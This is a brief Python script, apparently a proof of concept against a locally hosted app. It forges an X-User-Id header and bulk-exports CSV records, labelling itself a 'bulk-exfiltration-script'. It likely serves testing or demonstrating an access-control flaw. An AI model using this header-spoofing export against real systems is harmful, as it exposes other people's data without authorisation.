import requests


def run(base_url: str = "http://127.0.0.1:8000", attacker_user_id: int = 99):
    response = requests.get(
        f"{base_url}/exports/csv?limit=180",
        headers={"X-User-Id": str(attacker_user_id), "User-Agent": "bulk-exfiltration-script"},
        timeout=10,
    )
    print("Status:", response.status_code)
    print("Rows exported:", response.json().get("exported_rows"))
    print("Sample:", response.json().get("data", [])[:2])


if __name__ == "__main__":
    run()